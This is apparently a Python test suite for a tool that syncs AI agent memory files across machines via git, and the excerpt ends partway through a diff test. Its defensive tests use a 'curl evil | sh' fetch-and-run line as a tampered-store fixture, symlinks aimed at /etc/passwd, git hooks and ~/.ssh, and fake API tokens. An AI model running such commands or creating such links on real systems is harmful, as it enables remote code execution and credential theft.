import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from punk_records import cli, secrets  # noqa: E402
from punk_records.discover import discover, is_memory_path, scan  # noqa: E402
from punk_records.mcp import handle  # noqa: E402
from punk_records.store import PunkError, Store, normalize_remote  # noqa: E402

# Tests mean LF content on every OS. Path.write_text has no `newline` argument before Python 3.10,
# and on Windows it would write CRLF.
Path.write_text = lambda self, data, encoding=None, errors=None: self.write_bytes(  # type: ignore[method-assign]
    data.encode(encoding or "utf-8", errors or "strict"))

GIT_ENV = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t@t", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}


def git(*args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self._env = dict(os.environ)
        os.environ.update(GIT_ENV)
        os.environ["HOME"] = str(self.tmp / "home")
        os.environ["USERPROFILE"] = str(self.tmp / "home")  # Path.home() on Windows
        (self.tmp / "home").mkdir()

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._env)

    def project(self, name, remote="git@github.com:Me/App.git"):
        p = self.tmp / name
        p.mkdir(parents=True)
        git("init", "-q", cwd=p)
        git("remote", "add", "origin", remote, cwd=p)
        return p


class TestDiscovery(Base):
    def test_finds_memory_files_and_skips_noise(self):
        p = self.project("app")
        for rel in ["CLAUDE.md", "AGENTS.md", "pkg/CLAUDE.md", ".claude/napkin.md",
                    ".cursor/rules/style.mdc", ".github/copilot-instructions.md",
                    "node_modules/x/CLAUDE.md", "README.md", ".claude/settings.json"]:
            (p / rel).parent.mkdir(parents=True, exist_ok=True)
            (p / rel).write_text("x")
        self.assertEqual(discover(p), [".claude/napkin.md", ".cursor/rules/style.mdc",
                                       ".github/copilot-instructions.md", "AGENTS.md", "CLAUDE.md",
                                       "pkg/CLAUDE.md"])

    def test_never_allows_git_internals(self):
        cfg = {"include": [".git/hooks/*"]}
        self.assertFalse(is_memory_path(".git/hooks/post-checkout", "project", cfg))
        self.assertFalse(is_memory_path("../evil/CLAUDE.md", "project"))

    def test_normalize_remote(self):
        self.assertEqual(normalize_remote("git@github.com:Me/App.git"), "github.com/me/app")
        self.assertEqual(normalize_remote("https://github.com/me/app"), "github.com/me/app")


class TestSecrets(unittest.TestCase):
    def test_detect_and_redact(self):
        text = "use key sk-ant-api03-abcdefghijklmnopqrstuvwxyz\nAKIAABCDEFGHIJKLMNOP\nok"
        hits = secrets.scan(text)
        self.assertEqual([h.kind for h in hits], ["anthropic-key", "aws-access-key"])
        self.assertNotIn("sk-ant", secrets.redact(text))

    def test_allow_marker(self):
        self.assertEqual(secrets.scan("AKIAABCDEFGHIJKLMNOP example  punk:allow"), [])


class TestSync(Base):
    def test_two_machines_via_remote(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)

        # Machine A
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_text("# rules\n- use tabs\n")
        sid = a.track(pa)
        self.assertEqual(sid, "github.com/me/app")
        a.sync()

        # Machine B clones the store, tracks its checkout of the same repo
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        acts = b.sync()
        self.assertIn("add", [x.kind for x in acts])
        self.assertEqual((pb / "CLAUDE.md").read_text(), "# rules\n- use tabs\n")

        # B learns something, A picks it up
        (pb / "CLAUDE.md").write_text("# rules\n- use tabs\n- run tests with make\n")
        b.sync()
        a.sync()
        self.assertIn("run tests with make", (pa / "CLAUDE.md").read_text())

        # Concurrent appends merge (union) instead of conflicting
        (pa / "CLAUDE.md").write_text((pa / "CLAUDE.md").read_text() + "- from A\n")
        (pb / "CLAUDE.md").write_text((pb / "CLAUDE.md").read_text() + "- from B\n")
        a.sync()
        b.sync()
        a.sync()
        for p in (pa, pb):
            text = (p / "CLAUDE.md").read_text()
            self.assertIn("- from A", text)
            self.assertIn("- from B", text)

    def test_bytes_survive_autocrlf(self):
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text("[core]\n\tautocrlf = true\n")  # Git for Windows' default
        os.environ["GIT_CONFIG_GLOBAL"] = str(gitconfig)
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_bytes(b"lf line\n")
        (pa / "AGENTS.md").write_bytes(b"crlf line\r\n")
        a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")
        self.assertEqual((pb / "AGENTS.md").read_bytes(), b"crlf line\r\n")
        self.assertEqual(b.sync(), [])
        self.assertEqual(a.sync(), [])

    def two_machines_with_gitconfig(self, gitconfig_text, strip_store_attributes=False):
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text(gitconfig_text)
        os.environ["GIT_CONFIG_GLOBAL"] = str(gitconfig)
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        if strip_store_attributes:  # a store whose .gitattributes lacks `* -text`
            (a.root / ".gitattributes").write_text("records/** merge=union\n")
            a.commit("older attributes")
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_bytes(b"lf line\n")
        a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        return pb

    def test_store_attributes_beat_global_attributes(self):
        attrs = self.tmp / "attributes"
        attrs.write_text("* text eol=crlf\n")
        pb = self.two_machines_with_gitconfig(f"[core]\n\tattributesFile = {attrs.as_posix()}\n")
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")

    def test_clone_disables_autocrlf_even_without_store_attributes(self):
        pb = self.two_machines_with_gitconfig("[core]\n\tautocrlf = true\n", strip_store_attributes=True)
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")

    def test_append_keeps_line_endings(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_bytes(b"one\r\ntwo\r\n")
        sid = s.track(p)
        s.save()
        s.append(sid, "CLAUDE.md", "three")
        self.assertEqual((p / "CLAUDE.md").read_bytes(), b"one\r\ntwo\r\nthree\r\n")
        (p / "napkin.md").write_bytes(b"a\n")
        s.save()
        s.append(sid, "napkin.md", "b\nc")
        self.assertEqual((p / "napkin.md").read_bytes(), b"a\nb\nc\n")
        self.assertEqual(s.save(), [])

    def test_air_gapped_bundle(self):
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        pa = self.project("a/app")
        (pa / "AGENTS.md").write_text("be nice\n")
        a.track(pa)
        a.save()
        (self.tmp / "usb").mkdir()
        bundle = a.export_bundle(self.tmp / "usb" / "records.bundle")

        c = Store(self.tmp / "c-store")
        c.init(machine="c", track_global=False)
        pc = self.project("c/app")
        c.track(pc)
        c.import_bundle(bundle)
        self.assertEqual((pc / "AGENTS.md").read_text(), "be nice\n")

        # and back again
        (pc / "AGENTS.md").write_text("be nice\nbe brief\n")
        c.save()
        a.import_bundle(c.export_bundle(self.tmp / "usb" / "back.bundle"))
        self.assertEqual((pa / "AGENTS.md").read_text(), "be nice\nbe brief\n")

    def test_conflict_is_reported_not_clobbered(self):
        a = Store(self.tmp / "s")
        a.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = a.track(p)
        a.save()
        # someone else changes the store copy, and the local file also changes
        (a.records / sid / "CLAUDE.md").write_text("store v2\n")
        a.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        self.assertEqual([x.kind for x in a.restore()], ["conflict"])
        self.assertEqual((p / "CLAUDE.md").read_text(), "local v2\n")
        a.restore(force=True)
        self.assertEqual((p / "CLAUDE.md").read_text(), "store v2\n")
        self.assertEqual((p / "CLAUDE.md.punk-bak").read_text(), "local v2\n")

    def test_secrets_blocked(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("token ghp_" + "a" * 36 + "\n")
        sid = s.track(p)
        self.assertEqual([x.kind for x in s.save()], ["blocked"])
        self.assertFalse((s.records / sid / "CLAUDE.md").exists())
        s.save(redact=True)
        self.assertIn("[REDACTED:github-token]", (s.records / sid / "CLAUDE.md").read_text())

    def test_deletion_propagates(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "napkin.md").write_text("n\n")
        sid = s.track(p)
        s.save()
        (p / "napkin.md").unlink()
        self.assertEqual([x.kind for x in s.save()], ["delete"])
        self.assertFalse((s.records / sid / "napkin.md").exists())

    def test_global_memories(self):
        home = Path(os.environ["HOME"])
        (home / ".claude").mkdir()
        (home / ".claude" / "CLAUDE.md").write_text("I like short answers\n")
        (home / ".claude" / "projects").mkdir()
        (home / ".claude" / "projects" / "CLAUDE.md").write_text("not global\n")
        s = Store(self.tmp / "s")
        s.init()
        s.save()
        self.assertEqual(s.memories("global"), [("global", ".claude/CLAUDE.md")])
        self.assertIn("short answers", s.context(self.tmp))


class TestCLIEncoding(Base):
    def test_piped_output_is_utf8(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("- \u2713 \u65e5\u672c\n")
        sid = s.track(p)
        s.save()
        env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "cp1252"}  # Windows pipe
        r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "show", sid, "CLAUDE.md"],
                           capture_output=True, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.replace(b"\r\n", b"\n"), "- \u2713 \u65e5\u672c\n".encode())


class TestPortability(unittest.TestCase):
    def test_product_code_never_writes_text_mode(self):
        """Text-mode writes turn "\\n" into "\\r\\n" on Windows and break byte-exact hashes. The tests
        patch Path.write_text to LF for their own fixtures, so this guard keeps product code off it."""
        import re
        offenders = []
        for f in sorted((ROOT / "src" / "punk_records").glob("*.py")):
            for n, line in enumerate(f.read_text(encoding="utf-8").splitlines(), 1):
                if re.search(r"\.write_text\(|open\([^)]*['\"][wa]t?['\"]", line):
                    offenders.append(f"{f.name}:{n}: {line.strip()}")
        self.assertEqual(offenders, [])


class TestReadme(unittest.TestCase):
    def test_links_work_on_pypi(self):
        """PyPI renders README.md as the project page and cannot resolve relative links or images."""
        import re
        text = (ROOT / "README.md").read_text(encoding="utf-8")
        relative = [t for t in re.findall(r"\]\(([^)\s]+)\)", text) if not t.startswith(("https://", "http://", "#"))]
        relative += re.findall(r"<img[^>]+src=[\"'](?!https?://)([^\"']+)", text)
        self.assertEqual(relative, [])


class TestMCP(Base):
    def test_tools(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("hello\n")
        sid = s.track(p)
        s.save()
        init = handle(s, {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
        self.assertEqual(init["result"]["serverInfo"]["name"], "punk-records")
        self.assertIsNone(handle(s, {"jsonrpc": "2.0", "method": "notifications/initialized"}))
        names = [t["name"] for t in handle(s, {"jsonrpc": "2.0", "id": 2, "method": "tools/list"})["result"]["tools"]]
        self.assertIn("append_memory", names)

        def call(name, **args):
            r = handle(s, {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                           "params": {"name": name, "arguments": args}})["result"]
            return r["content"][0]["text"], r["isError"]

        call("append_memory", satellite=sid, path="CLAUDE.md", text="- lesson learned")
        self.assertIn("lesson learned", (p / "CLAUDE.md").read_text())  # propagated locally
        text, err = call("search_memories", query="LESSON")
        self.assertFalse(err)
        self.assertIn("CLAUDE.md:2", text)
        _, err = call("append_memory", satellite=sid, path=".git/config", text="x")
        self.assertTrue(err)

    def test_stdio_server(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        msgs = "\n".join(json.dumps(m) for m in [
            {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}},
            {"jsonrpc": "2.0", "method": "notifications/initialized"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        ]) + "\n"
        out = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "mcp"],
                             input=msgs.encode(), capture_output=True,
                             env={**os.environ, "PYTHONPATH": str(ROOT / "src")}, check=True).stdout
        self.assertNotIn(b"\r", out)  # newline-delimited JSON, also on Windows
        replies = [json.loads(x) for x in out.decode("utf-8").splitlines()]
        self.assertEqual([r["id"] for r in replies], [1, 2])

    def test_stdio_server_is_utf8(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("caf\u00e9\n")
        sid = s.track(p)
        s.save()
        msgs = "\n".join(json.dumps(m, ensure_ascii=False) for m in [
            {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "append_memory", "arguments": {
                "satellite": sid, "path": "CLAUDE.md", "text": "- \u2713 na\u00efve \u65e5\u672c"}}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "read_memory", "arguments": {
                "satellite": sid, "path": "CLAUDE.md"}}},
        ]) + "\n"
        env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "cp1252"}  # a Windows default
        out = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "mcp"],
                             input=msgs.encode("utf-8"), capture_output=True, env=env, check=True).stdout
        replies = [json.loads(x) for x in out.decode("utf-8").splitlines()]
        self.assertEqual(replies[1]["result"]["content"][0]["text"],
                         "caf\u00e9\n- \u2713 na\u00efve \u65e5\u672c\n")
        self.assertEqual((p / "CLAUDE.md").read_bytes(), "caf\u00e9\n- \u2713 na\u00efve \u65e5\u672c\n".encode())


# Relative link targets use the OS separator, as a user's `ln -s` or `mklink` would; Windows does not
# resolve "/" in a relative symlink target.


def can_symlink():
    with tempfile.TemporaryDirectory() as d:
        try:
            os.symlink("x", os.path.join(d, "l"))
            return True
        except (OSError, NotImplementedError):
            return False


@unittest.skipUnless(can_symlink(), "symlinks not supported here")
class TestSymlinks(Base):
    def remote_pair(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_text("shared rules\n")
        sid = a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        return a, pa, b, pb, sid

    def test_scan_classifies_links(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        (p / "README.md").write_text("readme\n")
        (self.tmp / "outside.md").write_text("elsewhere\n")
        (p / "docs").mkdir()
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        os.symlink(os.path.join("..", "CLAUDE.md"), p / "docs" / "GEMINI.md")
        os.symlink("README.md", p / "AGENT.md")
        os.symlink(str(self.tmp / "outside.md"), p / "napkin.md")
        os.symlink("missing.md", p / "CLAUDE.local.md")
        os.symlink("CLAUDE.md", p / "notes.txt")  # not a memory path: ignored silently
        files, links, warnings, followed = scan(p)
        self.assertEqual(followed, {})
        self.assertEqual(files, ["CLAUDE.md"])
        self.assertEqual(discover(p), ["CLAUDE.md"])
        self.assertEqual(links, {"AGENTS.md": "CLAUDE.md", "docs/GEMINI.md": "CLAUDE.md"})
        why = dict(warnings)
        self.assertEqual(sorted(why), ["AGENT.md", "CLAUDE.local.md", "napkin.md"])
        self.assertIn("outside", why["napkin.md"])
        self.assertIn("not a memory file", why["AGENT.md"])
        self.assertIn("broken", why["CLAUDE.local.md"])

    def test_link_recorded_and_recreated(self):
        a, pa, b, pb, sid = self.remote_pair()
        (pa / "sub").mkdir()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        os.symlink(os.path.join("..", "CLAUDE.md"), pa / "sub" / "AGENTS.md")
        acts = a.sync()
        self.assertIn(("add", "AGENTS.md"), [(x.kind, x.rel) for x in acts])
        meta = json.loads((a.root / "satellites" / f"{sid}.json").read_text())
        self.assertEqual(meta["links"], {"AGENTS.md": "CLAUDE.md", "sub/AGENTS.md": "CLAUDE.md"})
        self.assertFalse((a.records / sid / "AGENTS.md").exists())  # content stored once
        self.assertEqual(a.save(), [])  # idempotent

        b.sync()
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertEqual(os.readlink(pb / "AGENTS.md"), "CLAUDE.md")
        self.assertEqual(os.readlink(pb / "sub" / "AGENTS.md"), os.path.join("..", "CLAUDE.md"))
        self.assertEqual((pb / "AGENTS.md").read_text(), "shared rules\n")
        self.assertEqual(b.sync(), [])

        # removal upstream: stale until --prune
        (pa / "sub" / "AGENTS.md").unlink()
        self.assertIn(("delete", "sub/AGENTS.md"), [(x.kind, x.rel) for x in a.sync()])
        self.assertIn(("stale", "sub/AGENTS.md"), [(x.kind, x.rel) for x in b.sync()])
        self.assertTrue((pb / "sub" / "AGENTS.md").is_symlink())
        b.restore(prune=True)
        self.assertFalse(os.path.lexists(pb / "sub" / "AGENTS.md"))
        self.assertTrue((pb / "CLAUDE.md").is_file())

    def test_file_converted_to_link_and_back(self):
        a, pa, b, pb, sid = self.remote_pair()
        (pa / "AGENTS.md").write_text("old copy\n")
        a.sync()
        b.sync()
        self.assertEqual((pb / "AGENTS.md").read_text(), "old copy\n")

        (pa / "AGENTS.md").unlink()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        self.assertEqual([x.kind for x in a.restore()], [])  # pending save, not a conflict
        a.sync()
        self.assertFalse((a.records / sid / "AGENTS.md").exists())
        b.sync()
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertFalse((pb / "AGENTS.md.punk-bak").exists())  # it was an unchanged synced copy

        (pb / "AGENTS.md").unlink()
        (pb / "AGENTS.md").write_text("standalone again\n")
        b.sync()
        self.assertEqual(b.links(sid), {})
        a.sync()
        self.assertFalse((pa / "AGENTS.md").is_symlink())
        self.assertEqual((pa / "AGENTS.md").read_text(), "standalone again\n")
        self.assertEqual((pa / "CLAUDE.md").read_text(), "shared rules\n")

    def test_local_file_not_clobbered_by_link(self):
        a, pa, b, pb, sid = self.remote_pair()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        a.sync()
        b.git("pull", "-q")
        (pb / "AGENTS.md").write_text("my own agents notes\n")
        acts = b.restore()
        self.assertEqual([(x.kind, x.rel) for x in acts], [("conflict", "AGENTS.md")])
        self.assertEqual((pb / "AGENTS.md").read_text(), "my own agents notes\n")
        b.restore(force=True)
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertEqual((pb / "AGENTS.md.punk-bak").read_text(), "my own agents notes\n")

    def test_restore_never_writes_through_symlinks(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("keep me\n")
        sid = s.track(p)
        s.save()
        # a store from another machine has AGENTS.md as a regular file; here it is a link
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        (s.records / sid / "AGENTS.md").write_text("from elsewhere\n")
        s.commit("other machine")
        self.assertEqual([(x.kind, x.rel) for x in s.restore()], [("conflict", "AGENTS.md")])
        self.assertEqual((p / "CLAUDE.md").read_text(), "keep me\n")
        s.restore(force=True)
        self.assertFalse((p / "AGENTS.md").is_symlink())
        self.assertEqual((p / "AGENTS.md").read_text(), "from elsewhere\n")
        self.assertEqual((p / "CLAUDE.md").read_text(), "keep me\n")

    def test_tampered_links_are_refused(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        (p / ".claude" / "skills" / "dir").mkdir(parents=True)
        sid = s.track(p)
        s.save()
        evil = {".git/hooks/post-checkout": "CLAUDE.md", "AGENTS.md": "../../outside/CLAUDE.md",
                "GEMINI.md": ".git/config", "napkin.md": "/etc/passwd", "AGENT.md": ".claude/skills/dir",
                "run.sh": "CLAUDE.md"}
        s._write_links(sid, evil)
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual(sorted(x.rel for x in acts if x.kind == "blocked"), sorted(evil))
        for rel in evil:
            self.assertFalse(os.path.lexists(p / rel), rel)

    def test_links_never_created_through_symlinked_dirs(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        outside = self.tmp / "outside"
        (outside / "rules").mkdir(parents=True)
        (outside / "rules" / "real.mdc").write_text("elsewhere\n")
        os.symlink(str(outside), p / ".cursor")
        sid = s.track(p)
        s.save()
        s._write_links(sid, {".cursor/rules/x.mdc": "CLAUDE.md", "AGENTS.md": ".cursor/rules/real.mdc"})
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual(sorted(x.rel for x in acts if x.kind == "blocked"),
                         [".cursor/rules/x.mdc", "AGENTS.md"])
        self.assertFalse(os.path.lexists(outside / "rules" / "x.mdc"))
        self.assertFalse(os.path.lexists(p / "AGENTS.md"))

    def test_new_local_link_survives_prune(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("same\n")
        (p / "AGENTS.md").write_text("same\n")
        sid = s.track(p)
        s.save()
        (p / "AGENTS.md").unlink()
        os.symlink("CLAUDE.md", p / "AGENTS.md")  # not saved yet
        (s.records / sid / "AGENTS.md").unlink()  # another machine deleted the file
        s.commit("other machine")
        s.restore(prune=True)
        self.assertTrue((p / "AGENTS.md").is_symlink())
        s.save()
        self.assertEqual(s.links(sid), {"AGENTS.md": "CLAUDE.md"})

    def test_append_and_read_follow_recorded_links(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        sid = s.track(p)
        s.save()
        s.append(sid, "AGENTS.md", "- lesson")
        self.assertFalse((s.records / sid / "AGENTS.md").exists())
        self.assertEqual((s.records / sid / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        self.assertEqual(s.read(sid, "AGENTS.md"), "rules\n- lesson\n")
        self.assertEqual(s.restore(), [])
        self.assertTrue((p / "AGENTS.md").is_symlink())
        self.assertEqual((p / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        r = handle(s, {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {
            "name": "append_memory", "arguments": {"satellite": sid, "path": "AGENTS.md", "text": "- via mcp"}}})
        self.assertFalse(r["result"]["isError"])
        self.assertIn("- via mcp", (p / "CLAUDE.md").read_text())
        # this machine's link wins over a differing store record
        s._write_links(sid, {"AGENTS.md": "GEMINI.md", "GEMINI.md": "AGENT.md", "AGENT.md": "GEMINI.md"})
        s.commit("other machine")
        self.assertEqual(s.append(sid, "AGENTS.md", "- local wins"), "CLAUDE.md")
        with self.assertRaises(PunkError):  # a loop recorded in the store is refused
            s.append(sid, "GEMINI.md", "x")

    def test_append_follows_unsaved_local_link(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        sid = s.track(p)
        s.save()
        os.symlink("CLAUDE.md", p / "AGENTS.md")  # made after the last save
        self.assertEqual(s.append(sid, "AGENTS.md", "- lesson"), "CLAUDE.md")
        self.assertFalse((s.records / sid / "AGENTS.md").exists())
        self.assertEqual((p / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        self.assertEqual(s.restore(), [])
        (self.tmp / "outside.md").write_text("elsewhere\n")
        os.symlink(str(self.tmp / "outside.md"), p / "GEMINI.md")  # leaves the project: not followed
        (s.root / "punk.json").write_text('{"include": ["*"], "exclude": []}')  # permissive synced config
        self.assertEqual(s.append(sid, "GEMINI.md", "- note"), "GEMINI.md")
        self.assertEqual((self.tmp / "outside.md").read_text(), "elsewhere\n")

    def test_global_dotfile_links_are_followed(self):
        home = Path(os.environ["HOME"])
        dot = home / "dotfiles" / "claude"
        dot.mkdir(parents=True)
        (dot / "CLAUDE.md").write_text("I like short answers\n")
        (dot / "review.md").write_text("review command\n")
        (home / ".claude" / "commands").mkdir(parents=True)
        os.symlink(os.path.join("..", "dotfiles", "claude", "CLAUDE.md"), home / ".claude" / "CLAUDE.md")
        os.symlink(str(dot / "review.md"), home / ".claude" / "commands" / "review.md")
        found = scan(home, "global")
        self.assertEqual(found.files, [".claude/CLAUDE.md", ".claude/commands/review.md"])
        self.assertEqual(found.followed, {".claude/CLAUDE.md": "dotfiles/claude/CLAUDE.md",
                                          ".claude/commands/review.md": "dotfiles/claude/review.md"})
        self.assertEqual(found.warnings, [])

        s = Store(self.tmp / "s")
        s.init()
        s.save()
        self.assertEqual((s.records / "global" / ".claude" / "CLAUDE.md").read_text(), "I like short answers\n")
        # another machine edits it: restore writes through the link into the dotfiles repo
        (s.records / "global" / ".claude" / "CLAUDE.md").write_text("I like short answers\nno emojis\n")
        s.commit("other machine")
        self.assertEqual([(x.kind, x.rel) for x in s.restore()], [("update", ".claude/CLAUDE.md")])
        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
        self.assertEqual((dot / "CLAUDE.md").read_text(), "I like short answers\nno emojis\n")
        # and local edits made in the dotfiles repo are saved
        (dot / "CLAUDE.md").write_text("I like short answers\nno emojis\nuse uv\n")
        self.assertEqual([(x.kind, x.rel) for x in s.save()], [("update", ".claude/CLAUDE.md")])
        self.assertIn("use uv", (s.records / "global" / ".claude" / "CLAUDE.md").read_text())
        # an agent appending to the global memory also lands in the dotfiles repo
        self.assertEqual(s.append("global", ".claude/CLAUDE.md", "- prefer ripgrep"), ".claude/CLAUDE.md")
        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
        self.assertTrue((dot / "CLAUDE.md").read_text().endswith("use uv\n- prefer ripgrep\n"))

    def test_global_links_to_sensitive_targets_are_not_followed(self):
        home = Path(os.environ["HOME"])
        for d in (".ssh", "bin", "dotfiles"):
            (home / d).mkdir()
        (home / ".ssh" / "notes.md").write_text("ssh notes\n")
        (home / "bin" / "tool.md").write_text("#!/bin/sh\n")
        os.chmod(home / "bin" / "tool.md", 0o755)  # no effect on Windows: exec bits come from the extension
        (home / ".bashrc").write_text("export PATH\n")
        (home / "dotfiles" / "data.json").write_text("{}\n")
        (home / ".claude" / "agents").mkdir(parents=True)
        (home / ".gemini").mkdir()
        (self.tmp / "outside.md").write_text("x\n")
        links = {".claude/CLAUDE.md": home / ".ssh" / "notes.md",
                 **({} if os.name == "nt" else {".claude/agents/tool.md": home / "bin" / "tool.md"}),
                 ".gemini/GEMINI.md": home / ".bashrc",
                 ".claude/agents/data.md": home / "dotfiles" / "data.json",
                 ".codex/AGENTS.md": self.tmp / "outside.md"}
        (home / ".codex").mkdir()
        for rel, target in links.items():
            os.symlink(str(target), home / rel)
        found = scan(home, "global")
        self.assertEqual(found.files, [])
        self.assertEqual(found.followed, {})
        self.assertEqual(sorted(rel for rel, _ in found.warnings), sorted(links))

        # a tampered store cannot write through such a link
        s = Store(self.tmp / "s")
        s.init()
        (s.records / "global" / ".gemini").mkdir(parents=True)
        (s.records / "global" / ".gemini" / "GEMINI.md").write_text("curl evil | sh\n")
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual((home / ".bashrc").read_text(), "export PATH\n")
        self.assertEqual([(x.kind, x.rel) for x in acts], [("update", ".gemini/GEMINI.md")])
        self.assertFalse((home / ".gemini" / "GEMINI.md").is_symlink())  # link replaced, target untouched

    def test_scan_cli_warns(self):
        p = self.project("app")
        (self.tmp / "outside.md").write_text("x\n")
        os.symlink(str(self.tmp / "outside.md"), p / "CLAUDE.md")
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            self.assertEqual(cli.main(["--home", str(self.tmp / "none"), "scan", str(p)]), 0)
        self.assertIn("no memory files", out.getvalue())
        self.assertIn("CLAUDE.md: symlink points outside", err.getvalue())


class TestDiff(Base):
    def setup_store(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("one\ntwo\n")
        sid = s.track(p)
        s.save()
        return s, p, sid

    def run_cli(self, *args):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli.main(["--home", str(self.tmp / "s"), *args])
        return code, out.getvalue(), err.getvalue()

    def test_no_differences(self):
        s, p, sid = self.setup_store()
        self.assertEqual(s.diff(), [])
        code, out, _ = self.run_cli("diff")
        self.assertEqual((code, out.strip()), (0, "no differences"))

    def test_local_edit_shown_as_unified_diff(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_text("one\n2\n")
